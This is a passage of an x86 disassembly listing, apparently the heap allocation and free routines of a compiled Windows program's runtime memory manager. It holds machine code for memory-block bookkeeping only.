  40167b:	e8 ec fb ff ff       	call   0x40126c
  401680:	eb 35                	jmp    0x4016b7
  401682:	8b 1b                	mov    (%ebx),%ebx
  401684:	3b dd                	cmp    %ebp,%ebx
  401686:	75 c9                	jne    0x401651
  401688:	8b d6                	mov    %esi,%edx
  40168a:	8b c7                	mov    %edi,%eax
  40168c:	e8 f7 fc ff ff       	call   0x401388
  401691:	83 3e 00             	cmpl   $0x0,(%esi)
  401694:	74 21                	je     0x4016b7
  401696:	8b cc                	mov    %esp,%ecx
  401698:	8b d6                	mov    %esi,%edx
  40169a:	8b c5                	mov    %ebp,%eax
  40169c:	e8 e3 fb ff ff       	call   0x401284
  4016a1:	83 3c 24 00          	cmpl   $0x0,(%esp)
  4016a5:	75 a5                	jne    0x40164c
  4016a7:	8b cc                	mov    %esp,%ecx
  4016a9:	8b 56 04             	mov    0x4(%esi),%edx
  4016ac:	8b 06                	mov    (%esi),%eax
  4016ae:	e8 b1 fd ff ff       	call   0x401464
  4016b3:	33 c0                	xor    %eax,%eax
  4016b5:	89 06                	mov    %eax,(%esi)
  4016b7:	59                   	pop    %ecx
  4016b8:	5a                   	pop    %edx
  4016b9:	5d                   	pop    %ebp
  4016ba:	5f                   	pop    %edi
  4016bb:	5e                   	pop    %esi
  4016bc:	5b                   	pop    %ebx
  4016bd:	c3                   	ret
  4016be:	8b c0                	mov    %eax,%eax
  4016c0:	53                   	push   %ebx
  4016c1:	56                   	push   %esi
  4016c2:	57                   	push   %edi
  4016c3:	55                   	push   %ebp
  4016c4:	83 c4 ec             	add    $0xffffffec,%esp
  4016c7:	89 0c 24             	mov    %ecx,(%esp)
  4016ca:	8b fa                	mov    %edx,%edi
  4016cc:	8b f0                	mov    %eax,%esi
  4016ce:	bd e4 c5 41 00       	mov    $0x41c5e4,%ebp
  4016d3:	81 c7 ff 3f 00 00    	add    $0x3fff,%edi
  4016d9:	81 e7 00 c0 ff ff    	and    $0xffffc000,%edi
  4016df:	8b 5d 00             	mov    0x0(%ebp),%ebx
  4016e2:	eb 02                	jmp    0x4016e6
  4016e4:	8b 1b                	mov    (%ebx),%ebx
  4016e6:	3b dd                	cmp    %ebp,%ebx
  4016e8:	74 05                	je     0x4016ef
  4016ea:	3b 73 08             	cmp    0x8(%ebx),%esi
  4016ed:	75 f5                	jne    0x4016e4
  4016ef:	3b 73 08             	cmp    0x8(%ebx),%esi
  4016f2:	75 57                	jne    0x40174b
  4016f4:	3b 7b 0c             	cmp    0xc(%ebx),%edi
  4016f7:	0f 8e 96 00 00 00    	jle    0x401793
  4016fd:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  401701:	8b d7                	mov    %edi,%edx
  401703:	2b 53 0c             	sub    0xc(%ebx),%edx
  401706:	8b 43 08             	mov    0x8(%ebx),%eax
  401709:	03 43 0c             	add    0xc(%ebx),%eax
  40170c:	e8 db fc ff ff       	call   0x4013ec
  401711:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  401716:	74 33                	je     0x40174b
  401718:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  40171c:	8d 54 24 04          	lea    0x4(%esp),%edx
  401720:	8b c5                	mov    %ebp,%eax
  401722:	e8 5d fb ff ff       	call   0x401284
  401727:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  40172c:	75 b1                	jne    0x4016df
  40172e:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  401732:	8b 54 24 08          	mov    0x8(%esp),%edx
  401736:	8b 44 24 04          	mov    0x4(%esp),%eax
  40173a:	e8 25 fd ff ff       	call   0x401464
  40173f:	8b 04 24             	mov    (%esp),%eax
  401742:	33 d2                	xor    %edx,%edx
  401744:	89 10                	mov    %edx,(%eax)
  401746:	e9 90 00 00 00       	jmp    0x4017db
  40174b:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  40174f:	8b d7                	mov    %edi,%edx
  401751:	8b c6                	mov    %esi,%eax
  401753:	e8 94 fc ff ff       	call   0x4013ec
  401758:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  40175d:	74 34                	je     0x401793
  40175f:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  401763:	8d 54 24 04          	lea    0x4(%esp),%edx
  401767:	8b c5                	mov    %ebp,%eax
  401769:	e8 16 fb ff ff       	call   0x401284
  40176e:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  401773:	0f 85 66 ff ff ff    	jne    0x4016df
  401779:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  40177d:	8b 54 24 08          	mov    0x8(%esp),%edx
  401781:	8b 44 24 04          	mov    0x4(%esp),%eax
  401785:	e8 da fc ff ff       	call   0x401464
  40178a:	8b 04 24             	mov    (%esp),%eax
  40178d:	33 d2                	xor    %edx,%edx
  40178f:	89 10                	mov    %edx,(%eax)
  401791:	eb 48                	jmp    0x4017db
  401793:	8b 6b 08             	mov    0x8(%ebx),%ebp
  401796:	3b f5                	cmp    %ebp,%esi
  401798:	75 3a                	jne    0x4017d4
  40179a:	3b 7b 0c             	cmp    0xc(%ebx),%edi
  40179d:	7f 35                	jg     0x4017d4
  40179f:	8b 0c 24             	mov    (%esp),%ecx
  4017a2:	8b d7                	mov    %edi,%edx
  4017a4:	8b c5                	mov    %ebp,%eax
  4017a6:	e8 71 fd ff ff       	call   0x40151c
  4017ab:	8b 04 24             	mov    (%esp),%eax
  4017ae:	83 38 00             	cmpl   $0x0,(%eax)
  4017b1:	74 28                	je     0x4017db
  4017b3:	8b 04 24             	mov    (%esp),%eax
  4017b6:	8b 40 04             	mov    0x4(%eax),%eax
  4017b9:	01 43 08             	add    %eax,0x8(%ebx)
  4017bc:	8b 04 24             	mov    (%esp),%eax
  4017bf:	8b 40 04             	mov    0x4(%eax),%eax
  4017c2:	29 43 0c             	sub    %eax,0xc(%ebx)
  4017c5:	83 7b 0c 00          	cmpl   $0x0,0xc(%ebx)
  4017c9:	75 10                	jne    0x4017db
  4017cb:	8b c3                	mov    %ebx,%eax
  4017cd:	e8 9a fa ff ff       	call   0x40126c
  4017d2:	eb 07                	jmp    0x4017db
  4017d4:	8b 04 24             	mov    (%esp),%eax
  4017d7:	33 d2                	xor    %edx,%edx
  4017d9:	89 10                	mov    %edx,(%eax)
  4017db:	83 c4 14             	add    $0x14,%esp
  4017de:	5d                   	pop    %ebp
  4017df:	5f                   	pop    %edi
  4017e0:	5e                   	pop    %esi
  4017e1:	5b                   	pop    %ebx
  4017e2:	c3                   	ret
  4017e3:	90                   	nop
  4017e4:	53                   	push   %ebx
  4017e5:	56                   	push   %esi
  4017e6:	57                   	push   %edi
  4017e7:	83 c4 ec             	add    $0xffffffec,%esp
  4017ea:	8b f9                	mov    %ecx,%edi
  4017ec:	89 14 24             	mov    %edx,(%esp)
  4017ef:	8d 98 ff 3f 00 00    	lea    0x3fff(%eax),%ebx
  4017f5:	81 e3 00 c0 ff ff    	and    $0xffffc000,%ebx
  4017fb:	8b 34 24             	mov    (%esp),%esi
  4017fe:	03 f0                	add    %eax,%esi
  401800:	81 e6 00 c0 ff ff    	and    $0xffffc000,%esi
  401806:	3b de                	cmp    %esi,%ebx
  401808:	73 5b                	jae    0x401865
  40180a:	8b cf                	mov    %edi,%ecx
  40180c:	8b d6                	mov    %esi,%edx
  40180e:	2b d3                	sub    %ebx,%edx
  401810:	8b c3                	mov    %ebx,%eax
  401812:	e8 99 fd ff ff       	call   0x4015b0
  401817:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  40181b:	8b d7                	mov    %edi,%edx
  40181d:	b8 e4 c5 41 00       	mov    $0x41c5e4,%eax
  401822:	e8 5d fa ff ff       	call   0x401284
  401827:	8b 5c 24 04          	mov    0x4(%esp),%ebx
  40182b:	85 db                	test   %ebx,%ebx
  40182d:	74 1f                	je     0x40184e
  40182f:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  401833:	8b 54 24 08          	mov    0x8(%esp),%edx
  401837:	8b c3                	mov    %ebx,%eax
  401839:	e8 26 fc ff ff       	call   0x401464
  40183e:	8b 44 24 0c          	mov    0xc(%esp),%eax
  401842:	89 44 24 04          	mov    %eax,0x4(%esp)
  401846:	8b 44 24 10          	mov    0x10(%esp),%eax
  40184a:	89 44 24 08          	mov    %eax,0x8(%esp)
  40184e:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  401853:	74 14                	je     0x401869
  401855:	8d 54 24 04          	lea    0x4(%esp),%edx
  401859:	b8 e4 c5 41 00       	mov    $0x41c5e4,%eax
  40185e:	e8 91 fa ff ff       	call   0x4012f4
  401863:	eb 04                	jmp    0x401869
  401865:	33 c0                	xor    %eax,%eax
  401867:	89 07                	mov    %eax,(%edi)
  401869:	83 c4 14             	add    $0x14,%esp
  40186c:	5f                   	pop    %edi
  40186d:	5e                   	pop    %esi
  40186e:	5b                   	pop    %ebx
  40186f:	c3                   	ret
  401870:	55                   	push   %ebp
  401871:	8b ec                	mov    %esp,%ebp
  401873:	33 d2                	xor    %edx,%edx
  401875:	55                   	push   %ebp
  401876:	68 26 19 40 00       	push   $0x401926
  40187b:	64 ff 32             	push   %fs:(%edx)
  40187e:	64 89 22             	mov    %esp,%fs:(%edx)
  401881:	68 b4 c5 41 00       	push   $0x41c5b4
  401886:	e8 39 f9 ff ff       	call   0x4011c4
  40188b:	80 3d 35 c0 41 00 00 	cmpb   $0x0,0x41c035
  401892:	74 0a                	je     0x40189e
  401894:	68 b4 c5 41 00       	push   $0x41c5b4
  401899:	e8 2e f9 ff ff       	call   0x4011cc
  40189e:	b8 d4 c5 41 00       	mov    $0x41c5d4,%eax
  4018a3:	e8 8c f9 ff ff       	call   0x401234
  4018a8:	b8 e4 c5 41 00       	mov    $0x41c5e4,%eax
  4018ad:	e8 82 f9 ff ff       	call   0x401234
  4018b2:	b8 10 c6 41 00       	mov    $0x41c610,%eax
  4018b7:	e8 78 f9 ff ff       	call   0x401234
  4018bc:	68 f8 0f 00 00       	push   $0xff8
  4018c1:	6a 00                	push   $0x0
  4018c3:	e8 dc f8 ff ff       	call   0x4011a4
  4018c8:	a3 0c c6 41 00       	mov    %eax,0x41c60c
  4018cd:	83 3d 0c c6 41 00 00 	cmpl   $0x0,0x41c60c
  4018d4:	74 2f                	je     0x401905
  4018d6:	b8 03 00 00 00       	mov    $0x3,%eax
  4018db:	8b 15 0c c6 41 00    	mov    0x41c60c,%edx
  4018e1:	33 c9                	xor    %ecx,%ecx
  4018e3:	89 4c 82 f4          	mov    %ecx,-0xc(%edx,%eax,4)
  4018e7:	40                   	inc    %eax
  4018e8:	3d 01 04 00 00       	cmp    $0x401,%eax
  4018ed:	75 ec                	jne    0x4018db
  4018ef:	b8 f4 c5 41 00       	mov    $0x41c5f4,%eax
  4018f4:	89 40 04             	mov    %eax,0x4(%eax)
  4018f7:	89 00                	mov    %eax,(%eax)
  4018f9:	a3 00 c6 41 00       	mov    %eax,0x41c600
  4018fe:	c6 05 ac c5 41 00 01 	movb   $0x1,0x41c5ac
  401905:	33 c0                	xor    %eax,%eax
  401907:	5a                   	pop    %edx
  401908:	59                   	pop    %ecx
  401909:	59                   	pop    %ecx
  40190a:	64 89 10             	mov    %edx,%fs:(%eax)
  40190d:	68 2d 19 40 00       	push   $0x40192d
  401912:	80 3d 35 c0 41 00 00 	cmpb   $0x0,0x41c035
  401919:	74 0a                	je     0x401925
  40191b:	68 b4 c5 41 00       	push   $0x41c5b4
  401920:	e8 af f8 ff ff       	call   0x4011d4
  401925:	c3                   	ret
  401926:	e9 55 16 00 00       	jmp    0x402f80
  40192b:	eb e5                	jmp    0x401912
  40192d:	a0 ac c5 41 00       	mov    0x41c5ac,%al
  401932:	5d                   	pop    %ebp
  401933:	c3                   	ret
  401934:	55                   	push   %ebp
  401935:	8b ec                	mov    %esp,%ebp
  401937:	53                   	push   %ebx
  401938:	80 3d ac c5 41 00 00 	cmpb   $0x0,0x41c5ac
  40193f:	0f 84 cc 00 00 00    	je     0x401a11
  401945:	33 d2                	xor    %edx,%edx
  401947:	55                   	push   %ebp
  401948:	68 0a 1a 40 00       	push   $0x401a0a
  40194d:	64 ff 32             	push   %fs:(%edx)
  401950:	64 89 22             	mov    %esp,%fs:(%edx)
  401953:	80 3d 35 c0 41 00 00 	cmpb   $0x0,0x41c035
  40195a:	74 0a                	je     0x401966
  40195c:	68 b4 c5 41 00       	push   $0x41c5b4
  401961:	e8 66 f8 ff ff       	call   0x4011cc
  401966:	c6 05 ac c5 41 00 00 	movb   $0x0,0x41c5ac
  40196d:	a1 0c c6 41 00       	mov    0x41c60c,%eax
  401972:	50                   	push   %eax
  401973:	e8 34 f8 ff ff       	call   0x4011ac
  401978:	33 c0                	xor    %eax,%eax
  40197a:	a3 0c c6 41 00       	mov    %eax,0x41c60c
  40197f:	8b 1d d4 c5 41 00    	mov    0x41c5d4,%ebx
  401985:	eb 12                	jmp    0x401999
  401987:	68 00 80 00 00       	push   $0x8000
  40198c:	6a 00                	push   $0x0
  40198e:	8b 43 08             	mov    0x8(%ebx),%eax
  401991:	50                   	push   %eax
  401992:	e8 25 f8 ff ff       	call   0x4011bc
  401997:	8b 1b                	mov    (%ebx),%ebx
  401999:	81 fb d4 c5 41 00    	cmp    $0x41c5d4,%ebx
  40199f:	75 e6                	jne    0x401987
  4019a1:	b8 d4 c5 41 00       	mov    $0x41c5d4,%eax
  4019a6:	e8 89 f8 ff ff       	call   0x401234
  4019ab:	b8 e4 c5 41 00       	mov    $0x41c5e4,%eax
  4019b0:	e8 7f f8 ff ff       	call   0x401234
  4019b5:	b8 10 c6 41 00       	mov    $0x41c610,%eax
  4019ba:	e8 75 f8 ff ff       	call   0x401234
  4019bf:	a1 cc c5 41 00       	mov    0x41c5cc,%eax
  4019c4:	85 c0                	test   %eax,%eax
  4019c6:	74 17                	je     0x4019df
  4019c8:	8b 10                	mov    (%eax),%edx
  4019ca:	89 15 cc c5 41 00    	mov    %edx,0x41c5cc
  4019d0:	50                   	push   %eax
  4019d1:	e8 d6 f7 ff ff       	call   0x4011ac
  4019d6:	a1 cc c5 41 00       	mov    0x41c5cc,%eax
  4019db:	85 c0                	test   %eax,%eax
  4019dd:	75 e9                	jne    0x4019c8
  4019df:	33 c0                	xor    %eax,%eax
  4019e1:	5a                   	pop    %edx
  4019e2:	59                   	pop    %ecx
  4019e3:	59                   	pop    %ecx
  4019e4:	64 89 10             	mov    %edx,%fs:(%eax)
  4019e7:	68 11 1a 40 00       	push   $0x401a11
  4019ec:	80 3d 35 c0 41 00 00 	cmpb   $0x0,0x41c035
  4019f3:	74 0a                	je     0x4019ff
  4019f5:	68 b4 c5 41 00       	push   $0x41c5b4
  4019fa:	e8 d5 f7 ff ff       	call   0x4011d4
  4019ff:	68 b4 c5 41 00       	push   $0x41c5b4
  401a04:	e8 d3 f7 ff ff       	call   0x4011dc
  401a09:	c3                   	ret
  401a0a:	e9 71 15 00 00       	jmp    0x402f80
  401a0f:	eb db                	jmp    0x4019ec
  401a11:	5b                   	pop    %ebx
  401a12:	5d                   	pop    %ebp
  401a13:	c3                   	ret
  401a14:	53                   	push   %ebx
  401a15:	3b 05 00 c6 41 00    	cmp    0x41c600,%eax
  401a1b:	75 09                	jne    0x401a26
  401a1d:	8b 50 04             	mov    0x4(%eax),%edx
  401a20:	89 15 00 c6 41 00    	mov    %edx,0x41c600
  401a26:	8b 50 04             	mov    0x4(%eax),%edx
  401a29:	8b 48 08             	mov    0x8(%eax),%ecx
  401a2c:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  401a32:	7f 38                	jg     0x401a6c
  401a34:	3b c2                	cmp    %edx,%eax
  401a36:	75 17                	jne    0x401a4f
  401a38:	85 c9                	test   %ecx,%ecx
  401a3a:	79 03                	jns    0x401a3f
  401a3c:	83 c1 03             	add    $0x3,%ecx
  401a3f:	c1 f9 02             	sar    $0x2,%ecx
  401a42:	a1 0c c6 41 00       	mov    0x41c60c,%eax
  401a47:	33 d2                	xor    %edx,%edx
  401a49:	89 54 88 f4          	mov    %edx,-0xc(%eax,%ecx,4)
  401a4d:	eb 24                	jmp    0x401a73
  401a4f:	85 c9                	test   %ecx,%ecx
  401a51:	79 03                	jns    0x401a56
  401a53:	83 c1 03             	add    $0x3,%ecx
  401a56:	c1 f9 02             	sar    $0x2,%ecx
  401a59:	8b 1d 0c c6 41 00    	mov    0x41c60c,%ebx
  401a5f:	89 54 8b f4          	mov    %edx,-0xc(%ebx,%ecx,4)
  401a63:	8b 00                	mov    (%eax),%eax
  401a65:	89 02                	mov    %eax,(%edx)
  401a67:	89 50 04             	mov    %edx,0x4(%eax)
  401a6a:	5b                   	pop    %ebx
  401a6b:	c3                   	ret
  401a6c:	8b 00                	mov    (%eax),%eax
  401a6e:	89 02                	mov    %eax,(%edx)
  401a70:	89 50 04             	mov    %edx,0x4(%eax)
  401a73:	5b                   	pop    %ebx
  401a74:	c3                   	ret
  401a75:	8d 40 00             	lea    0x0(%eax),%eax
  401a78:	8b 15 10 c6 41 00    	mov    0x41c610,%edx
  401a7e:	eb 10                	jmp    0x401a90
  401a80:	8b 4a 08             	mov    0x8(%edx),%ecx
  401a83:	3b c1                	cmp    %ecx,%eax
  401a85:	72 07                	jb     0x401a8e
  401a87:	03 4a 0c             	add    0xc(%edx),%ecx
  401a8a:	3b c1                	cmp    %ecx,%eax
  401a8c:	72 16                	jb     0x401aa4
  401a8e:	8b 12                	mov    (%edx),%edx
  401a90:	81 fa 10 c6 41 00    	cmp    $0x41c610,%edx
  401a96:	75 e8                	jne    0x401a80
  401a98:	c7 05 b0 c5 41 00 03 	movl   $0x3,0x41c5b0
  401a9f:	00 00 00 
  401aa2:	33 d2                	xor    %edx,%edx
  401aa4:	8b c2                	mov    %edx,%eax
  401aa6:	c3                   	ret
  401aa7:	90                   	nop
  401aa8:	53                   	push   %ebx
  401aa9:	8b ca                	mov    %edx,%ecx
  401aab:	83 e9 04             	sub    $0x4,%ecx
  401aae:	8d 1c 01             	lea    (%ecx,%eax,1),%ebx
  401ab1:	83 fa 10             	cmp    $0x10,%edx
  401ab4:	7c 0f                	jl     0x401ac5
  401ab6:	c7 03 07 00 00 80    	movl   $0x80000007,(%ebx)
  401abc:	8b d1                	mov    %ecx,%edx
  401abe:	e8 b9 01 00 00       	call   0x401c7c
  401ac3:	5b                   	pop    %ebx
  401ac4:	c3                   	ret
  401ac5:	83 fa 04             	cmp    $0x4,%edx
  401ac8:	7c 0c                	jl     0x401ad6
  401aca:	8b ca                	mov    %edx,%ecx
  401acc:	81 c9 02 00 00 80    	or     $0x80000002,%ecx
  401ad2:	89 08                	mov    %ecx,(%eax)
  401ad4:	89 0b                	mov    %ecx,(%ebx)
  401ad6:	5b                   	pop    %ebx
  401ad7:	c3                   	ret
  401ad8:	ff 05 9c c5 41 00    	incl   0x41c59c
  401ade:	8b d0                	mov    %eax,%edx
  401ae0:	83 ea 04             	sub    $0x4,%edx
  401ae3:	8b 12                	mov    (%edx),%edx
  401ae5:	81 e2 fc ff ff 7f    	and    $0x7ffffffc,%edx
  401aeb:	83 ea 04             	sub    $0x4,%edx
  401aee:	01 15 a0 c5 41 00    	add    %edx,0x41c5a0
  401af4:	e8 f3 05 00 00       	call   0x4020ec
  401af9:	c3                   	ret
  401afa:	8b c0                	mov    %eax,%eax
  401afc:	83 fa 0c             	cmp    $0xc,%edx
  401aff:	7c 0e                	jl     0x401b0f
  401b01:	83 ca 02             	or     $0x2,%edx
  401b04:	89 10                	mov    %edx,(%eax)
  401b06:	83 c0 04             	add    $0x4,%eax
  401b09:	e8 ca ff ff ff       	call   0x401ad8
  401b0e:	c3                   	ret
  401b0f:	83 fa 04             	cmp    $0x4,%edx
  401b12:	7c 0a                	jl     0x401b1e
  401b14:	8b ca                	mov    %edx,%ecx
  401b16:	81 c9 02 00 00 80    	or     $0x80000002,%ecx
  401b1c:	89 08                	mov    %ecx,(%eax)
  401b1e:	03 c2                	add    %edx,%eax
  401b20:	83 20 fe             	andl   $0xfffffffe,(%eax)
  401b23:	c3                   	ret
  401b24:	53                   	push   %ebx
  401b25:	56                   	push   %esi
  401b26:	8b d0                	mov    %eax,%edx
  401b28:	83 ea 04             	sub    $0x4,%edx
  401b2b:	8b 12                	mov    (%edx),%edx
  401b2d:	8b ca                	mov    %edx,%ecx
  401b2f:	81 e1 02 00 00 80    	and    $0x80000002,%ecx
  401b35:	81 f9 02 00 00 80    	cmp    $0x80000002,%ecx
  401b3b:	74 0a                	je     0x401b47
  401b3d:	c7 05 b0 c5 41 00 04 	movl   $0x4,0x41c5b0
  401b44:	00 00 00 
  401b47:	8b da                	mov    %edx,%ebx
  401b49:	81 e3 fc ff ff 7f    	and    $0x7ffffffc,%ebx
  401b4f:	2b c3                	sub    %ebx,%eax
  401b51:	8b c8                	mov    %eax,%ecx
  401b53:	33 11                	xor    (%ecx),%edx
  401b55:	f7 c2 fe ff ff ff    	test   $0xfffffffe,%edx
  401b5b:	74 0a                	je     0x401b67
  401b5d:	c7 05 b0 c5 41 00 05 	movl   $0x5,0x41c5b0
  401b64:	00 00 00 
  401b67:	f6 01 01             	testb  $0x1,(%ecx)
  401b6a:	74 20                	je     0x401b8c
  401b6c:	8b d0                	mov    %eax,%edx
  401b6e:	83 ea 0c             	sub    $0xc,%edx
  401b71:	8b 72 08             	mov    0x8(%edx),%esi
  401b74:	2b c6                	sub    %esi,%eax
  401b76:	3b 70 08             	cmp    0x8(%eax),%esi
  401b79:	74 0a                	je     0x401b85
  401b7b:	c7 05 b0 c5 41 00 06 	movl   $0x6,0x41c5b0
  401b82:	00 00 00 
  401b85:	e8 8a fe ff ff       	call   0x401a14
  401b8a:	03 de                	add    %esi,%ebx
  401b8c:	8b c3                	mov    %ebx,%eax
  401b8e:	5e                   	pop    %esi
  401b8f:	5b                   	pop    %ebx
  401b90:	c3                   	ret
  401b91:	8d 40 00             	lea    0x0(%eax),%eax
  401b94:	53                   	push   %ebx
  401b95:	56                   	push   %esi
  401b96:	57                   	push   %edi
  401b97:	8b d8                	mov    %eax,%ebx
  401b99:	33 ff                	xor    %edi,%edi
  401b9b:	8b 03                	mov    (%ebx),%eax
  401b9d:	a9 00 00 00 80       	test   $0x80000000,%eax
  401ba2:	74 0b                	je     0x401baf
  401ba4:	25 fc ff ff 7f       	and    $0x7ffffffc,%eax
  401ba9:	03 f8                	add    %eax,%edi
  401bab:	03 d8                	add    %eax,%ebx
  401bad:	8b 03                	mov    (%ebx),%eax
  401baf:	a8 02                	test   $0x2,%al
  401bb1:	75 13                	jne    0x401bc6
  401bb3:	8b f3                	mov    %ebx,%esi
  401bb5:	8b c6                	mov    %esi,%eax
  401bb7:	e8 58 fe ff ff       	call   0x401a14
  401bbc:	8b 46 08             	mov    0x8(%esi),%eax
  401bbf:	03 f8                	add    %eax,%edi
  401bc1:	03 d8                	add    %eax,%ebx
  401bc3:	83 23 fe             	andl   $0xfffffffe,(%ebx)
  401bc6:	8b c7                	mov    %edi,%eax
  401bc8:	5f                   	pop    %edi
  401bc9:	5e                   	pop    %esi
  401bca:	5b                   	pop    %ebx
  401bcb:	c3                   	ret
  401bcc:	53                   	push   %ebx
  401bcd:	56                   	push   %esi
  401bce:	57                   	push   %edi
  401bcf:	55                   	push   %ebp
  401bd0:	83 c4 f4             	add    $0xfffffff4,%esp
  401bd3:	8b fa                	mov    %edx,%edi
  401bd5:	8b f0                	mov    %eax,%esi
  401bd7:	c6 04 24 00          	movb   $0x0,(%esp)
  401bdb:	8b c6                	mov    %esi,%eax
  401bdd:	e8 96 fe ff ff       	call   0x401a78
  401be2:	8b d8                	mov    %eax,%ebx
  401be4:	85 db                	test   %ebx,%ebx
  401be6:	0f 84 82 00 00 00    	je     0x401c6e
  401bec:	8b 6b 08             	mov    0x8(%ebx),%ebp
  401bef:	8b c5                	mov    %ebp,%eax
  401bf1:	03 43 0c             	add    0xc(%ebx),%eax
  401bf4:	8b d0                	mov    %eax,%edx
  401bf6:	8d 0c 37             	lea    (%edi,%esi,1),%ecx
  401bf9:	2b d1                	sub    %ecx,%edx
  401bfb:	83 fa 0c             	cmp    $0xc,%edx
  401bfe:	7f 04                	jg     0x401c04
  401c00:	8b f8                	mov    %eax,%edi
  401c02:	2b fe                	sub    %esi,%edi
  401c04:	8b c6                	mov    %esi,%eax
  401c06:	2b c5                	sub    %ebp,%eax
  401c08:	83 f8 0c             	cmp    $0xc,%eax
  401c0b:	7d 14                	jge    0x401c21
  401c0d:	8d 4c 24 01          	lea    0x1(%esp),%ecx
  401c11:	8b d6                	mov    %esi,%edx
  401c13:	2b 53 08             	sub    0x8(%ebx),%edx
  401c16:	03 d7                	add    %edi,%edx
  401c18:	8b c5                	mov    %ebp,%eax
  401c1a:	e8 c5 fb ff ff       	call   0x4017e4
  401c1f:	eb 11                	jmp    0x401c32
  401c21:	8d 4c 24 01          	lea    0x1(%esp),%ecx
  401c25:	8b d7                	mov    %edi,%edx
  401c27:	83 ea 04             	sub    $0x4,%edx
  401c2a:	8d 46 04             	lea    0x4(%esi),%eax
  401c2d:	e8 b2 fb ff ff       	call   0x4017e4
  401c32:	8b 6c 24 01          	mov    0x1(%esp),%ebp
  401c36:	85 ed                	test   %ebp,%ebp
  401c38:	74 34                	je     0x401c6e
  401c3a:	8b d5                	mov    %ebp,%edx
  401c3c:	2b d6                	sub    %esi,%edx
  401c3e:	8b c6                	mov    %esi,%eax
  401c40:	e8 63 fe ff ff       	call   0x401aa8
  401c45:	8b c5                	mov    %ebp,%eax
  401c47:	03 44 24 05          	add    0x5(%esp),%eax
  401c4b:	8b 53 08             	mov    0x8(%ebx),%edx
  401c4e:	03 53 0c             	add    0xc(%ebx),%edx
  401c51:	3b c2                	cmp    %edx,%eax
  401c53:	73 0a                	jae    0x401c5f
  401c55:	8d 14 37             	lea    (%edi,%esi,1),%edx
  401c58:	2b d0                	sub    %eax,%edx
  401c5a:	e8 9d fe ff ff       	call   0x401afc
  401c5f:	8d 54 24 01          	lea    0x1(%esp),%edx
  401c63:	8b c3                	mov    %ebx,%eax
  401c65:	e8 8a f6 ff ff       	call   0x4012f4
  401c6a:	c6 04 24 01          	movb   $0x1,(%esp)
  401c6e:	8a 04 24             	mov    (%esp),%al
  401c71:	83 c4 0c             	add    $0xc,%esp
  401c74:	5d                   	pop    %ebp
  401c75:	5f                   	pop    %edi
  401c76:	5e                   	pop    %esi
  401c77:	5b                   	pop    %ebx
  401c78:	c3                   	ret
  401c79:	8d 40 00             	lea    0x0(%eax),%eax
  401c7c:	53                   	push   %ebx
  401c7d:	56                   	push   %esi
  401c7e:	57                   	push   %edi
  401c7f:	8b f2                	mov    %edx,%esi
  401c81:	8b f8                	mov    %eax,%edi
  401c83:	8b df                	mov    %edi,%ebx
  401c85:	89 73 08             	mov    %esi,0x8(%ebx)
  401c88:	8b c3                	mov    %ebx,%eax
  401c8a:	03 c6                	add    %esi,%eax
  401c8c:	83 e8 0c             	sub    $0xc,%eax
  401c8f:	89 70 08             	mov    %esi,0x8(%eax)
  401c92:	81 fe 00 10 00 00    	cmp    $0x1000,%esi
  401c98:	7f 37                	jg     0x401cd1
  401c9a:	8b d6                	mov    %esi,%edx
  401c9c:	85 d2                	test   %edx,%edx
  401c9e:	79 03                	jns    0x401ca3
  401ca0:	83 c2 03             	add    $0x3,%edx
  401ca3:	c1 fa 02             	sar    $0x2,%edx
  401ca6:	a1 0c c6 41 00       	mov    0x41c60c,%eax
  401cab:	8b 44 90 f4          	mov    -0xc(%eax,%edx,4),%eax
  401caf:	85 c0                	test   %eax,%eax
  401cb1:	75 10                	jne    0x401cc3
  401cb3:	a1 0c c6 41 00       	mov    0x41c60c,%eax
  401cb8:	89 5c 90 f4          	mov    %ebx,-0xc(%eax,%edx,4)
  401cbc:	89 5b 04             	mov    %ebx,0x4(%ebx)
  401cbf:	89 1b                	mov    %ebx,(%ebx)
  401cc1:	eb 3a                	jmp    0x401cfd
  401cc3:	8b 10                	mov    (%eax),%edx
  401cc5:	89 43 04             	mov    %eax,0x4(%ebx)
  401cc8:	89 13                	mov    %edx,(%ebx)
  401cca:	89 18                	mov    %ebx,(%eax)
  401ccc:	89 5a 04             	mov    %ebx,0x4(%edx)
  401ccf:	eb 2c                	jmp    0x401cfd
  401cd1:	81 fe 00 3c 00 00    	cmp    $0x3c00,%esi
  401cd7:	7c 0d                	jl     0x401ce6
  401cd9:	8b d6                	mov    %esi,%edx
  401cdb:	8b c7                	mov    %edi,%eax
  401cdd:	e8 ea fe ff ff       	call   0x401bcc
  401ce2:	84 c0                	test   %al,%al
  401ce4:	75 17                	jne    0x401cfd
  401ce6:	a1 00 c6 41 00       	mov    0x41c600,%eax
  401ceb:	89 1d 00 c6 41 00    	mov    %ebx,0x41c600
  401cf1:	8b 10                	mov    (%eax),%edx
  401cf3:	89 43 04             	mov    %eax,0x4(%ebx)
  401cf6:	89 13                	mov    %edx,(%ebx)
  401cf8:	89 18                	mov    %ebx,(%eax)
  401cfa:	89 5a 04             	mov    %ebx,0x4(%edx)
  401cfd:	5f                   	pop    %edi
  401cfe:	5e                   	pop    %esi
  401cff:	5b                   	pop    %ebx
  401d00:	c3                   	ret
  401d01:	8d 40 00             	lea    0x0(%eax),%eax
  401d04:	83 3d 04 c6 41 00 00 	cmpl   $0x0,0x41c604
  401d0b:	7e 40                	jle    0x401d4d
  401d0d:	83 3d 04 c6 41 00 0c 	cmpl   $0xc,0x41c604
  401d14:	7d 0c                	jge    0x401d22
  401d16:	c7 05 b0 c5 41 00 07 	movl   $0x7,0x41c5b0
  401d1d:	00 00 00 
  401d20:	eb 2b                	jmp    0x401d4d
  401d22:	a1 04 c6 41 00       	mov    0x41c604,%eax
  401d27:	83 c8 02             	or     $0x2,%eax
